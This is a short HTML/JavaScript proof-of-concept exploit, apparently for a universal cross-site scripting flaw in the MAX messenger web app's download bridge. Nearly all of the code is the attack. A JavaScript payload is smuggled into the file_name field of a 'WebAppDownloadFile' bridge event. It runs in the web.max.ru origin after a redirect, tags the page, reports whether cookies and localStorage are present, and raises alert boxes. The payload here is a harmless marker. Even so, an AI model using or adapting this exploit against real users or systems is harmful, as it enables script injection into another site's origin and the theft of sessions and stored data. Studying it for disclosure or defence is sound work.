<script>
  function DownloadFileFunction() {
    const blobUrl = URL.createObjectURL(
     new Blob(['UXSS'], {type: 'text/plain'})
   );
 
 const fileName = `'+(()=>{let e=document.createElement("mark");e.id="max-uxss-marker";e.textContent="UXSS@"+location.origin+" c="+!!document.cookie+" l="+localStorage.length;document.title=e.textContent;document.documentElement.prepend(e);alert(1);alert(window.origin);return""})()+'`;
 
 window.WebViewHandler.postEvent(
   'WebAppDownloadFile',
   JSON.stringify({
     requestId: 'bridge-poc-delayed-download',
     url: blobUrl,
     file_name: fileName
   })
 );
 
 location.replace('https://web.max.ru/');
  }
</script>
<script src="https://st.max.ru/js/max-web-app.js"></script>
